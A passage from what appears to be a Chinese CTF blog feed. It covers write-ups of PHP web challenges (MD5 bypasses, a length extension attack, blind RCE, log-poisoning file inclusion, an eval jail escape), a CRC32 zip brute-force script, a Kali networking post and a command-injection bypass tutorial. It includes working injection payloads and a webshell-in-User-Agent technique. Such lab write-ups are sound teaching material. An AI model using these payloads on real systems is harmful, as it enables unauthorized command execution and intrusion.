class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 什么? 你绕过去了?</span></span><br><span class="line"><span class="comment">// 加大剂量!</span></span><br><span class="line"><span class="comment">// 我要让他成为 string</span></span><br><span class="line"><span class="variable">$apple</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;appple&#x27;</span>];</span><br><span class="line"><span class="variable">$banana</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;bananana&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!((<span class="keyword">string</span>)<span class="variable">$apple</span> !== (<span class="keyword">string</span>)<span class="variable">$banana</span> &amp;&amp; <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$apple</span>) == <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$banana</span>))) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;难吗?不难!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 你还是绕过去了?</span></span><br><span class="line"><span class="comment">// 哦哦哦, 我少了一个等于号</span></span><br><span class="line"><span class="variable">$apple</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;apppple&#x27;</span>];</span><br><span class="line"><span class="variable">$banana</span> = (<span class="keyword">string</span>)<span class="variable">$_POST</span>[<span class="string">&#x27;banananana&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (!((<span class="keyword">string</span>)<span class="variable">$apple</span> !== (<span class="keyword">string</span>)<span class="variable">$banana</span> &amp;&amp; <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$apple</span>) === <span class="title function_ invoke__">md5</span>((<span class="keyword">string</span>)<span class="variable">$banana</span>))) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;嘻嘻, 不会了? 没看直播回放?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 你以为这就结束了</span></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;random&#x27;</span>])) &#123;</span><br><span class="line">    <span class="variable">$_SESSION</span>[<span class="string">&#x27;random&#x27;</span>] = <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>)) . <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>)) . <span class="title function_ invoke__">bin2hex</span>(<span class="title function_ invoke__">random_bytes</span>(<span class="number">16</span>));</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 你想看到 random 的值吗?</span></span><br><span class="line"><span class="comment">// 你不是很懂 MD5 吗? 那我就告诉你他的 MD5 吧</span></span><br><span class="line"><span class="variable">$random</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;random&#x27;</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="variable">$random</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&#x27;&lt;br /&gt;&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="variable">$name</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;name&#x27;</span>] ?? <span class="string">&#x27;user&#x27;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// check if name ends with &#x27;admin&#x27;</span></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">substr</span>(<span class="variable">$name</span>, -<span class="number">5</span>) !== <span class="string">&#x27;admin&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;不是管理员也来凑热闹?&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="variable">$md5</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;md5&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">md5</span>(<span class="variable">$random</span> . <span class="variable">$name</span>) !== <span class="variable">$md5</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;伪造? NO NO NO!&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 认输了, 看样子你真的很懂 MD5</span></span><br><span class="line"><span class="comment">// 那 flag 就给你吧</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;看样子你真的很懂 MD5&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;/flag&#x27;</span>); 加强难度就不会了?</span><br></pre></td></tr></table></figure><p>⼀共有 4 层，依次来绕过。 </p><p>第⼀层可以直接数组绕过。 </p><p>第⼆层和第三层都可以直接构造 md5 碰撞绕过。 </p><p>第四层涉及到 md5 ⻓度扩展攻击，即已知⼀个字符串的 md5 值和⻓度，并且要往他后⾯拼接⼀个可控 </p><p>的字符串，我们可以通过控制后⾯的字符串从⽽计算得到拼接后字符串的 md5 值。 </p><p>在这道题中，random 的⻓度已知（本地跑⼀下是96），random 的 md5 值已知，并且拼接的字符串可 </p><p>控（需要以 admin 结尾），这⾥通过下⾯这个脚本构造</p><h3 id="你听不到我的声音"><a href="#你听不到我的声音" class="headerlink" title="你听不到我的声音"></a>你听不到我的声音</h3><p>考察知识点：无回显RCE</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">shell_exec</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;cmd&#x27;</span>]);</span><br></pre></td></tr></table></figure><p>方法一：使用tee进行写入</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cmd=cat /flag | tee <span class="number">1</span>.txt</span><br></pre></td></tr></table></figure><p><img src="/img/1725763539178-7.png" alt="img"></p><p>方法二：使用&gt;进行文件写入</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">cmd=cat /flag &gt; <span class="number">2</span>.txt</span><br></pre></td></tr></table></figure><p><img src="/img/1725763539178-8.png" alt="img"></p><h3 id="滤个不停"><a href="#滤个不停" class="headerlink" title="滤个不停"></a>滤个不停</h3><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"></span><br><span class="line"><span class="variable">$incompetent</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;incompetent&#x27;</span>];</span><br><span class="line"><span class="variable">$Datch</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;Datch&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$incompetent</span> !== <span class="string">&#x27;HelloWorld&#x27;</span>) &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;写出程序员的第一行问候吧！&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//这是个什么东东？？？</span></span><br><span class="line"><span class="variable">$required_chars</span> = [<span class="string">&#x27;s&#x27;</span>, <span class="string">&#x27;e&#x27;</span>, <span class="string">&#x27;v&#x27;</span>, <span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;n&#x27;</span>, <span class="string">&#x27;x&#x27;</span>, <span class="string">&#x27;r&#x27;</span>, <span class="string">&#x27;o&#x27;</span>];</span><br><span class="line"><span class="variable">$is_valid</span> = <span class="literal">true</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$required_chars</span> <span class="keyword">as</span> <span class="variable">$char</span>) &#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">strpos</span>(<span class="variable">$Datch</span>, <span class="variable">$char</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">        <span class="variable">$is_valid</span> = <span class="literal">false</span>;</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$is_valid</span>) &#123;</span><br><span class="line"></span><br><span class="line">    <span class="variable">$invalid_patterns</span> = [<span class="string">&#x27;php://&#x27;</span>, <span class="string">&#x27;http://&#x27;</span>, <span class="string">&#x27;https://&#x27;</span>, <span class="string">&#x27;ftp://&#x27;</span>, <span class="string">&#x27;file://&#x27;</span> , <span class="string">&#x27;data://&#x27;</span>, <span class="string">&#x27;gopher://&#x27;</span>];</span><br><span class="line"></span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$invalid_patterns</span> <span class="keyword">as</span> <span class="variable">$pattern</span>) &#123;</span><br><span class="line">        <span class="keyword">if</span> (<span class="title function_ invoke__">stripos</span>(<span class="variable">$Datch</span>, <span class="variable">$pattern</span>) !== <span class="literal">false</span>) &#123;</span><br><span class="line">            <span class="keyword">die</span>(<span class="string">&#x27;此路不通换条路试试?&#x27;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">include</span>(<span class="variable">$Datch</span>);</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">die</span>(<span class="string">&#x27;文件名不合规 请重试&#x27;</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>POST传参incompetent等于HelloWorld即可</p><p>第⼀层很简单，就是⼀个简单的判断字符串相等，传⼊指定字符串即可。 </p><p>第⼆层是⽂件包含漏洞，过滤了很多协议，这⾥可以使⽤⽇志包含。 </p><p>在 UA 头中写⼊⼀句话⽊⻢，然后包含 &#x2F;var&#x2F;log&#x2F;nginx&#x2F;access.log 。</p><p><img src="/img/1725763539179-9.png" alt="img"></p><h3 id="ez-php-jail"><a href="#ez-php-jail" class="headerlink" title="ez_php_jail"></a>ez_php_jail</h3><p>php沙盒逃逸</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">highlight_file</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line"><span class="title function_ invoke__">error_reporting</span>(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">include</span>(<span class="string">&quot;hint.html&quot;</span>);</span><br><span class="line"><span class="variable">$Jail</span> = <span class="variable">$_GET</span>[<span class="string">&#x27;Jail_by.Happy&#x27;</span>];</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$Jail</span> == <span class="literal">null</span>) <span class="keyword">die</span>(<span class="string">&quot;Do You Like My Jail?&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Like_Jail</span>(<span class="params"><span class="variable">$var</span></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="string">&#x27;/(`|\$|a|c|s|require|include)/i&#x27;</span>, <span class="variable">$var</span>)) &#123;</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">Like_Jail</span>(<span class="variable">$Jail</span>)) &#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="variable">$Jail</span>);</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;Yes! you escaped from the jail! LOL!&quot;</span>;</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;You will Jail in your life!&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;\n&quot;</span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">// 在HTML解析后再输出PHP源代码</span></span><br><span class="line"></span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line">Welcome to My Jail</span><br><span class="line">Do You Like My Jail?</span><br></pre></td></tr></table></figure><p>php沙盒逃逸</p><p>php版本小于8时，GET请求的参数含有***.***   则会转为***_***</p><p>但是如果直接有**[** ,这个[ 会被直接转化为_  ,但是如果后面有.  ,这个.就不会转化为_</p><p>这里使用highlight_file函数可以绕过</p><p>Payload</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">?Jail[by.Happy=<span class="title function_ invoke__">highlight_file</span>(<span class="title function_ invoke__">glob</span>(<span class="string">&quot;/f*&quot;</span>)[<span class="number">0</span>]);</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 比赛复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>moectf</title>
      <link href="/2024/09/04/moectf/"/>
      <url>/2024/09/04/moectf/</url>
      
        <content type="html"><![CDATA[<h3 id="解不开的压缩包"><a href="#解不开的压缩包" class="headerlink" title="解不开的压缩包"></a>解不开的压缩包</h3><p>题目有点意思，999层压缩包，也就是点999下，直接使用脚本解压吧</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_zip</span>(<span class="params">zip_file, extract_to</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">with</span> zipfile.ZipFile(zip_file, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> zip_ref:</span><br><span class="line">            zip_ref.extractall(extract_to)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;Error extracting <span class="subst">&#123;zip_file&#125;</span>: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">extract_all</span>(<span class="params">zip_file, output_dir</span>):</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(output_dir):</span><br><span class="line">        os.makedirs(output_dir)</span><br><span class="line"></span><br><span class="line">    success = extract_zip(zip_file, output_dir)</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> success:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="comment"># Iterate over the files extracted</span></span><br><span class="line">    extracted_files = [os.path.join(output_dir, f) <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(output_dir)]</span><br><span class="line">    <span class="keyword">while</span> extracted_files:</span><br><span class="line">        new_extracted_files = []</span><br><span class="line">        <span class="keyword">for</span> file <span class="keyword">in</span> extracted_files:</span><br><span class="line">            <span class="keyword">if</span> zipfile.is_zipfile(file):</span><br><span class="line">                <span class="comment"># New directory to extract this zip file</span></span><br><span class="line">                new_dir = os.path.join(output_dir, os.path.basename(file).replace(<span class="string">&#x27;.zip&#x27;</span>, <span class="string">&#x27;&#x27;</span>))</span><br><span class="line">                <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(new_dir):</span><br><span class="line">                    os.makedirs(new_dir)</span><br><span class="line"></span><br><span class="line">                <span class="keyword">if</span> extract_zip(file, new_dir):</span><br><span class="line">                    new_extracted_files.extend([os.path.join(new_dir, f) <span class="keyword">for</span> f <span class="keyword">in</span> os.listdir(new_dir)])</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> new_extracted_files:</span><br><span class="line">            <span class="built_in">print</span>(<span class="string">&quot;No more zip files to extract.&quot;</span>)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line">        extracted_files = new_extracted_files</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    zip_file = <span class="string">&#x27;999.zip&#x27;</span></span><br><span class="line">    output_dir = <span class="string">&#x27;D:\python学习\压缩包&#x27;</span></span><br><span class="line">    extract_all(zip_file, output_dir)</span><br></pre></td></tr></table></figure><p>CRC32碰撞2byte爆破</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/python3.8</span></span><br><span class="line"><span class="comment"># -*- coding: utf-8 -*-</span></span><br><span class="line"><span class="keyword">import</span> zipfile</span><br><span class="line"><span class="keyword">import</span> binascii</span><br><span class="line"><span class="keyword">import</span> string</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">title</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+-----------------------------------------------------+&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+              渊龙Sec安全团队CTF工具包               +&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+              团队公开QQ群：877317946                +&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+               Title: CRC-Tools_2Byte                +&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+      python3 2Byte-CRC.py --&gt; 2Byte &gt;&gt;&gt; Demo.zip    +&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+                作者：曾哥（AabyssZG）               +&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+                 版本：V1.3单文件版                  +&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+-----------------------------------------------------+&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">FileRead</span>(<span class="params">zipname</span>):</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        f =<span class="built_in">open</span>(zipname)                               <span class="comment">#打开目标文件</span></span><br><span class="line">        f.close()</span><br><span class="line">    <span class="keyword">except</span> FileNotFoundError:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;未找到同目录下的压缩包文件&quot;</span> + zipname) <span class="comment">#如果未找到文件，输出错误</span></span><br><span class="line">        <span class="keyword">return</span>                                         <span class="comment">#退出线程，进行详细报错</span></span><br><span class="line">    <span class="keyword">except</span> PermissionError:</span><br><span class="line">        <span class="built_in">print</span> (<span class="string">&quot;无法读取目标压缩包（无权限访问）&quot;</span>)     <span class="comment">#如果发现目标文件无权限，输出错误</span></span><br><span class="line">        <span class="keyword">return</span>                                         <span class="comment">#退出线程，进行详细报错</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">TwoByte</span>(<span class="params">zipname</span>):</span><br><span class="line">    zip_url = <span class="string">&quot;./&quot;</span> + zipname</span><br><span class="line">    file_zip = zipfile.ZipFile(zip_url)    <span class="comment">#用zipfile读取指定的压缩包文件</span></span><br><span class="line">    name_list = file_zip.namelist()        <span class="comment">#使用一个列表，获取并存储压缩包内所有的文件名</span></span><br><span class="line">    crc_list = []</span><br><span class="line">    crc32_list = []</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+--------------遍历指定压缩包的CRC值----------------+&#x27;</span>)</span><br><span class="line">    <span class="keyword">for</span> name <span class="keyword">in</span> name_list:</span><br><span class="line">        name_message = file_zip.getinfo(name)</span><br><span class="line">        crc_list.append(name_message.CRC)</span><br><span class="line">        crc32_list.append(<span class="built_in">hex</span>(name_message.CRC))</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;[OK] &#123;0&#125;: &#123;1&#125;&#x27;</span>.<span class="built_in">format</span>(name,<span class="built_in">hex</span>(name_message.CRC)))</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+-------------对输出的CRC值进行碰撞-----------------+&#x27;</span>)</span><br><span class="line">    comment = <span class="string">&#x27;&#x27;</span></span><br><span class="line">    chars = string.printable</span><br><span class="line">    <span class="keyword">for</span> crc_value <span class="keyword">in</span> crc_list:</span><br><span class="line">        <span class="keyword">for</span> char1 <span class="keyword">in</span> chars:</span><br><span class="line">            <span class="keyword">for</span> char2 <span class="keyword">in</span> chars:</span><br><span class="line">                res_char = char1 + char2                        <span class="comment">#获取任意2Byte字符</span></span><br><span class="line">                thicken_crc = binascii.crc32(res_char.encode()) <span class="comment">#获取任意2Byte字符串的CRC32值</span></span><br><span class="line">                calc_crc = thicken_crc &amp; <span class="number">0xffffffff</span>             <span class="comment">#将任意2Byte字符串的CRC32值与0xffffffff进行与运算</span></span><br><span class="line">                <span class="keyword">if</span> calc_crc == crc_value:                       <span class="comment">#匹配两个CRC32值</span></span><br><span class="line">                    <span class="built_in">print</span>(<span class="string">&#x27;[Success] &#123;&#125;: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(<span class="built_in">hex</span>(crc_value),res_char))</span><br><span class="line">                    comment += res_char</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&#x27;+-----------------CRC碰撞结束！！！-----------------+&#x27;</span>)</span><br><span class="line">    crc32_list = <span class="built_in">str</span>(crc32_list)</span><br><span class="line">    crc32_list = crc32_list.replace(<span class="string">&#x27;\&#x27;&#x27;</span> , <span class="string">&#x27;&#x27;</span>)</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;读取成功，导出CRC列表为：&quot;</span> + crc32_list)                     <span class="comment">#导出CRC列表</span></span><br><span class="line">    <span class="keyword">if</span> comment:</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;CRC碰撞成功，结果为: &#123;&#125;&#x27;</span>.<span class="built_in">format</span>(comment))                  <span class="comment">#输出CRC碰撞结果</span></span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">      <span class="built_in">print</span>(<span class="string">&#x27;CRC碰撞没有结果，请检查压缩包内文件是否为2Byte！！！&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&#x27;__main__&#x27;</span>:</span><br><span class="line">    title()</span><br><span class="line">    zipname = <span class="built_in">str</span>(<span class="built_in">input</span>(<span class="string">&quot;请输入压缩包名字：\n2Byte &gt;&gt;&gt; &quot;</span>))</span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        <span class="keyword">if</span> zipname:</span><br><span class="line">            FileRead(zipname)</span><br><span class="line">            TwoByte(zipname)</span><br><span class="line">    <span class="keyword">except</span> BaseException <span class="keyword">as</span> e:</span><br><span class="line">        err = <span class="built_in">str</span>(e)</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&#x27;脚本详细报错：&#x27;</span> + err)</span><br></pre></td></tr></table></figure><p><img src="/img/1725444774449-1.png" alt="img"></p><p>密码为*m:#P7j0</p><p>moectf{af9c688e-e0b9-4900-879c-672b44c550ea}</p>]]></content>
      
      
      <categories>
          
          <category> 比赛复现 </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>kali配置网络</title>
      <link href="/2024/08/01/kali%E9%85%8D%E7%BD%AE%E7%BD%91%E7%BB%9C/"/>
      <url>/2024/08/01/kali%E9%85%8D%E7%BD%AE%E7%BD%91%E7%BB%9C/</url>
      
        <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>之前一直想xshell连接我的kali,可以减少一些麻烦事，结果一直本地ping不同我的虚拟机ip，虽然我使用的是net模式，但是我虚拟机网卡vm8都没有，我也是服了，就是之前我安装的硬盘报废了，vm虚拟机没删除干净，这里可以重新安装vm虚拟机</p><p>推荐博客:如何彻底删除vm虚拟机</p><p><a href="https://blog.csdn.net/Wysnbb/article/details/123996480">https://blog.csdn.net/Wysnbb/article/details/123996480</a></p><p>博客挺好的，严格按照上面来没有问题，细节问题可以看看评论</p><p>这里使用桥接模式来</p><p><img src="/img/1722475245419-8.png" alt="img"></p><p>查看一下我们的wifi连接RZ608啥的，记住这个称号（之前是没有vm1和8的）</p><p><img src="/img/1722475245413-1.png" alt="img"></p><p>查看主机的ip(网段是192.168.5.0)</p><p><img src="/img/1722475245414-2.png" alt="img"></p><p>root下开启</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">vim /etc/network/interfaces</span><br></pre></td></tr></table></figure><p><img src="/img/1722475245415-3.png" alt="img"></p><p>这里的address,网关和掩码都设置成一个分段的，修改完成后:wq保存，然后重启网卡</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line">systemctl restart networking</span><br></pre></td></tr></table></figure><p>查看我们虚拟机ip：192.168.5.76</p><p><img src="/img/1722475245415-4.png" alt="img"></p><p>ping一下，是连接成功的</p><p><img src="/img/1722475245416-5.png" alt="img"></p><p>本地ping一下</p><p><img src="/img/1722475245416-6.png" alt="img"></p><p>xshell输入ip，账号，密码连接上了，呜呜呜，太难了</p><p><img src="/img/1722475245416-7.png" alt="img"></p><p>终于还是做到了！</p>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>命令执行</title>
      <link href="/2024/07/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/"/>
      <url>/2024/07/26/%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C/</url>
      
        <content type="html"><![CDATA[<h3 id="常见危险函数"><a href="#常见危险函数" class="headerlink" title="常见危险函数"></a>常见危险函数</h3><h4 id="system"><a href="#system" class="headerlink" title="system"></a>system</h4><p>system()函数可以执行系统命令, 并将命令执行的结果直接输出到界面中, 使用时直接在参数中传入需要执行的命令即可</p><h4 id="Passthru"><a href="#Passthru" class="headerlink" title="Passthru"></a>Passthru</h4><p>passthru()函数可以执行系统命令, 并将执行结果输出到页面中, 与system()函数不同的是, 它支持二进制的数据, 更多的用于文件, 图片等操作, 使用时直接在参数中传递字符串类型的系统命令即可</p><h4 id="shell-exec"><a href="#shell-exec" class="headerlink" title="shell_exec"></a>shell_exec</h4><p>shell_exec()函数可以执行系统命令, 但它不会直接输出执行的结果, 而是返回一个字符串类型的变量来存储系统命令的执行结果, 在参数中传递需要执行的系统命令即可</p><h4 id="反引号"><a href="#反引号" class="headerlink" title="反引号"></a>反引号</h4><p>反引号可以执行系统命令, 但它不会输出结果, 而是返回一个字符串类型的变量, 用来存储系统命令的执行结果, 可单独使用, 也可配合其他命令执行函数使用来绕过参数中的过滤条件</p><h4 id="popen"><a href="#popen" class="headerlink" title="popen"></a>popen</h4><p>popen()函数可以执行系统命令, 但不会输出执行的结果, 而是返回一个资源类型的变量用来存储系统命令的执行结果, 需要配合fread()函数来读取命令的执行结果</p><h4 id="proc-open"><a href="#proc-open" class="headerlink" title="proc_open"></a>proc_open</h4><p>proc_open — 执行一个命令，并且打开用来输入&#x2F;输出的文件指针。</p><p>参数：command    descriptor_spec    pipes   </p><p>作用类似于popen</p><h3 id="绕过方式"><a href="#绕过方式" class="headerlink" title="绕过方式"></a>绕过方式</h3><h4 id="空格过滤绕过"><a href="#空格过滤绕过" class="headerlink" title="空格过滤绕过"></a>空格过滤绕过</h4><p>1：利用大括号进行绕过</p><p><strong>?<strong><strong>cmd</strong></strong>{<strong><strong>ls</strong></strong>,-l}</strong></p><p>2:$IFS代替空格；$IFS,${IFS},$IFS$9</p><p>3:重定向字符  &lt;,&lt;&gt;</p><p>“&lt;”表示的是输入重定向的意思，就是把&lt;后面跟的文件取代键盘作为新的设备</p><p><strong>?<strong><strong>cmd</strong></strong>&#x3D;cat&lt;flag.php</strong></p><p>4:%09(Tab)</p><p>payload为</p><p><strong>?cmd&#x3D;cat%09flag.php</strong></p><h5 id="例题"><a href="#例题" class="headerlink" title="例题"></a>例题</h5><p>**[GXYCTF 2019]**<strong>Ping</strong> <strong>Ping Ping</strong></p><p>ping是ip的一个参数:可以联想到127.0.0.1</p><p>查看当前存在的目录文件夹：?ip&#x3D;127.0.0.1;ls</p><p><img src="/img/1722310534823-4.png" alt="img"></p><p>找到flag.php,index.php</p><p>cat flag.php,发现空格绕过，这里使用$IFS$9进行绕过</p><p><img src="/img/1722310534824-5.png" alt="img"></p><p>cat index.php</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line">        |\<span class="string">&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match))&#123;</span></span><br><span class="line"><span class="string">                        print_r($match);</span></span><br><span class="line"><span class="string">                        print($ip);</span></span><br><span class="line"><span class="string">                        echo preg_match(&quot;/\&amp;|\/|\?|\*|\&lt;|[\x&#123;00&#125;-\x&#123;20&#125;]|\&gt;|\&#x27;|\&quot;|\\|\(|\)|\[|\]|\&#123;|\&#125;/&quot;, $ip, $match);</span></span><br><span class="line"><span class="string">                        die(&quot;fxck your symbol!&quot;);</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                else if(preg_match(&quot;/ /&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">                        die(&quot;fxck your space!&quot;);</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                else if(preg_match(&quot;/bash/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">                        die(&quot;fxck your bash!&quot;);</span></span><br><span class="line"><span class="string">                &#125;</span></span><br><span class="line"><span class="string">                else if(preg_match(&quot;/.*f.*l.*a.*g.*/&quot;, $ip))&#123;</span></span><br><span class="line"><span class="string">                        die(&quot;fxck your 